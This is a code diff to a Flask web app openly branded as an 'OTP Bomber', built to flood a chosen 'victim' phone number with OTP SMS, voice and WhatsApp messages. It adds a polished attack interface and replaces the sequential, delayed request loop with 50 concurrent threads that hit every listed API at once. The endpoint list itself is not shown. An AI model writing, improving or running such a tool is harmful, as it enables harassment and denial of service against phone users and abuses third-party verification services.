@@ -1,6 +1,7 @@
 import os
 import requests
 import time
+import concurrent.futures
 from flask import Flask, request, render_template_string, jsonify
 
 app = Flask(__name__)
@@ -70,25 +71,200 @@ APIS = [
 HTML_PAGE = """
 <!DOCTYPE html>
 <html>
-<head><title>OTP Bomber</title></head>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚡ OTP Bomber | CYBER TOOLS</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(145deg, #0a0f1e 0%, #0c1222 100%);
+            font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .glass-card {
+            background: rgba(20, 28, 40, 0.75);
+            backdrop-filter: blur(12px);
+            border-radius: 48px;
+            border: 1px solid rgba(72, 187, 255, 0.3);
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 600px;
+            padding: 32px 28px;
+        }
+        .tool-name {
+            text-align: center;
+            font-size: 1.8rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #FFD966, #FF8C42);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 5px;
+            letter-spacing: 1px;
+        }
+        h1 {
+            font-size: 2rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #FFFFFF, #7AC8FF);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            justify-content: center;
+        }
+        h1:before {
+            content: "💣";
+            font-size: 2rem;
+            background: none;
+            color: #ff5e7c;
+        }
+        .sub {
+            color: #8e9aaf;
+            margin-bottom: 28px;
+            text-align: center;
+            border-left: none;
+            font-size: 0.9rem;
+        }
+        .input-group { margin-bottom: 24px; }
+        label { display: block; color: #ccd6f0; margin-bottom: 10px; }
+        .phone-field {
+            display: flex;
+            background: #0f1420;
+            border-radius: 60px;
+            border: 1px solid #2a3246;
+        }
+        .phone-field:focus-within { border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59,130,246,0.3); }
+        .country-code {
+            background: #1a1f2e;
+            padding: 14px 18px;
+            border-radius: 60px 0 0 60px;
+            color: #b9c3db;
+            border-right: 1px solid #2a3246;
+        }
+        input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            padding: 14px 16px;
+            color: white;
+            font-size: 1rem;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            background: linear-gradient(95deg, #2563eb, #1e40af);
+            border: none;
+            padding: 14px;
+            border-radius: 60px;
+            font-weight: 700;
+            font-size: 1.1rem;
+            color: white;
+            cursor: pointer;
+            transition: 0.2s;
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+        button:hover { transform: scale(0.98); background: linear-gradient(95deg, #3b82f6, #2563eb); }
+        .output-box {
+            margin-top: 28px;
+            background: #0b0f18;
+            border-radius: 28px;
+            padding: 18px;
+            border: 1px solid #1e293b;
+            max-height: 380px;
+            overflow-y: auto;
+        }
+        pre {
+            font-family: monospace;
+            font-size: 0.75rem;
+            color: #a5f3c3;
+            white-space: pre-wrap;
+        }
+        .badge {
+            background: #1e293b;
+            border-radius: 30px;
+            padding: 4px 12px;
+            font-size: 0.7rem;
+            color: #94a3b8;
+            text-align: center;
+            margin-top: 16px;
+        }
+        .developer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.8rem;
+            color: #6c7a8e;
+            border-top: 1px solid #1e293b;
+            padding-top: 15px;
+        }
+    </style>
+</head>
 <body>
-<h2>OTP Bomber Tool</h2>
-<input type="text" id="phone" placeholder="10 ডিজিট ফোন নম্বর">
-<button onclick="startBomb()">Start Bomb</button>
-<pre id="output"></pre>
+<div class="glass-card">
+    <div class="tool-name">🔥 CYBER TOOLS 🔥</div>
+    <h1>OTP BOMBER</h1>
+    <div class="sub">☠️ flood any number with OTP calls & SMS</div>
+
+    <div class="input-group">
+        <label>📱 Victim Phone Number (10 digit)</label>
+        <div class="phone-field">
+            <span class="country-code">+91</span>
+            <input type="tel" id="phone" placeholder="9876543210" maxlength="10">
+        </div>
+    </div>
+
+    <button id="bombBtn">
+        <span>💥</span> START BOMBARDMENT
+    </button>
+
+    <div class="output-box">
+        <pre id="output">⚡ ready — enter number and launch</pre>
+    </div>
+    <div class="badge">
+        🔥 50+ APIs | Voice + WhatsApp + SMS
+    </div>
+    <div class="developer">
+        👨‍💻 Developer: Arif
+    </div>
+</div>
 <script>
-async function startBomb() {
-    let phone = document.getElementById('phone').value;
-    let out = document.getElementById('output');
-    out.innerText = 'Sending...\\n';
-    let res = await fetch('/bomb', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({phone: phone})
+    const bombBtn = document.getElementById('bombBtn');
+    const phoneInput = document.getElementById('phone');
+    const outputPre = document.getElementById('output');
+
+    bombBtn.addEventListener('click', async () => {
+        let phone = phoneInput.value.trim();
+        if (!phone || phone.length !== 10 || isNaN(phone)) {
+            outputPre.innerText = '❌ Invalid number! Enter 10 digits.';
+            return;
+        }
+        outputPre.innerText = '🌀 Sending bomb requests concurrently...\\n(May take 5-10 seconds)';
+        bombBtn.disabled = true;
+        bombBtn.style.opacity = '0.6';
+        try {
+            const response = await fetch('/bomb', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: phone })
+            });
+            const data = await response.json();
+            outputPre.innerText = data.log || '⚠️ Something went wrong. Try again.';
+        } catch (err) {
+            outputPre.innerText = '🚨 Network or server error. Render wake-up may take a moment.';
+        } finally {
+            bombBtn.disabled = false;
+            bombBtn.style.opacity = '1';
+        }
     });
-    let data = await res.json();
-    out.innerText = data.log;
-}
 </script>
 </body>
 </html>
@@ -118,12 +294,15 @@ def bomb():
     phone = request.json.get('phone')
     if not phone:
         return jsonify({"log": "Phone required"}), 400
-    logs = []
-    for api in APIS:
-        logs.append(send_request(api, phone))
-        time.sleep(0.3)
+
+    # সমান্তরালে সব API কল (ফাস্ট)
+    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+        futures = [executor.submit(send_request, api, phone) for api in APIS]
+        logs = [f.result() for f in concurrent.futures.as_completed(futures)]
+
     return jsonify({"log": "\n".join(logs)})
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
+    
